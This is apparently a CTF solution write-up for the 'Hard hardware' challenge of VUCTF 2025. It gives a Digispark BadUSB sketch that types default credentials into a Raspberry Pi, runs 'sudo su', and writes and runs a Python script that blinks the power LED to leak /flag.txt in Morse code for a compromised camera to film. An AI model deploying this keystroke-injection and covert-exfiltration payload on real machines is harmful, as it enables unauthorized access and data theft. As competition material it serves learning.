## Hard hardware
This is the hard hardware challenge part of the hardware challenge series during VUCTF 2025. 

**Target system**
- Raspberry pi os lite (64 bit) no desktop (2025-05-04)
- Raspberry pi 4B


The players needs to:
1. Write a script onto the digispark which will read the flag file and blink the leds of the raspberry pi
2. Capture the led blinks through the pwned IP camera. 
3. Read the capture and extract the flag

Script to do this
```c
// login
vuctf
vuctf

// get to root
sudo su

// change led brightness to max
echo 255 > /sys/class/leds/PWR/brightness

// change led brightness to min/off
echo 0 > /sys/class/leds/PWR/brightness


```


### Solve script
```c
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void send_keys(const char* command) {
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(command);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}


void loop() {

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  send_keys("vuctf");
  send_keys("vuctf");

  send_keys("sudo su");

  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("echo \"from os import system; from time import sleep; MORSE_CODE_DICT={'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','0':'-----',',':'--..--','.':'.-.-.-','?':'..--..','/':'-..-.','-':'-....-'}; change_brightness=lambda b:system(f\\\"echo {b} > /sys/class/leds/PWR/brightness\\\"); [any([change_brightness(255),sleep(2 if c=='.' else 0.5),change_brightness(0),sleep(0.5 if i<len(m)-1 else 5)]) for char in open('/flag.txt','r').read() for m in [MORSE_CODE_DICT.get(char.upper(),'')] for i,c in enumerate(m)]\" > /tmp/morse.py"));
  DigiKeyboard.delay(2000);
  send_keys("python3 /tmp/morse.py");
  DigiKeyboard.delay(2000);

  for(;;){}
}


```